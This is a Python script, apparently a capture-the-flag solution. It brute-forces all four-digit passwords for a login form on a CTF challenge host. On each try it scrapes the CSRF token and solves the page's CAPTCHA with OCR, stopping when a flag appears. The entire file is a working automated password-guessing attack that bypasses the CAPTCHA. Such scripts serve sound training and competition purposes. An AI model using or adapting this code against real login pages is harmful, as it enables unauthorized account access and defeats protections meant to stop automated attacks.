import requests
from PIL import Image
import pytesseract
from bs4 import BeautifulSoup

url = "http://cha.ccu-ctf.be:8002"
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

def get_token_and_captcha_image(session, url):
    response = session.get(url)
    print(response.text)
    
    soup = BeautifulSoup(response.content, 'html.parser')

    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    token = csrf_token['value'] if csrf_token else None

    captcha_img_tag = soup.find('img', {'class': 'captcha'})
    captcha_img_url = captcha_img_tag['src'] if captcha_img_tag else None

    return token, captcha_img_url

def download_captcha_image(session, captcha_img_url, filename='captcha.png'):
    response = session.get(captcha_img_url)
    print(captcha_img_url)
    
    with open(filename, 'wb') as f:
        f.write(response.content)

def resolve_captcha(image_path):
    captcha_image = Image.open(image_path)

    captcha_text = pytesseract.image_to_string(captcha_image)

    return captcha_text

session = requests.Session()

for i in range(10000):
    password = str(i).zfill(4)
    token, captcha_img_url = get_token_and_captcha_image(session, url)
    print("CSRF Token:", token)

    # Download the captcha image
    download_captcha_image(session, "http://cha.ccu-ctf.be:8002" + captcha_img_url)
    print(captcha_img_url)

    captcha_image_path = "captcha.png"
    resolved_captcha = resolve_captcha(captcha_image_path).strip()
    print(resolved_captcha)
    print("password : ", password)

    captcha_id = captcha_img_url.split("/")[-2]
    print(captcha_id)

    data = {
        "csrfmiddlewaretoken": token,
        "username": "user",
        "password": password,
        "captcha_0": captcha_id,
        "captcha_1": resolved_captcha
    }

    # Sending the POST request
    response = session.post(f'{url}/login', data=data)

    # Print the response from the s,rver
    print("resp : " + response.text)
    if "ctf{" in response.text.lower():
        print("Response contains 'ctf'. Breaking the loop.")
        break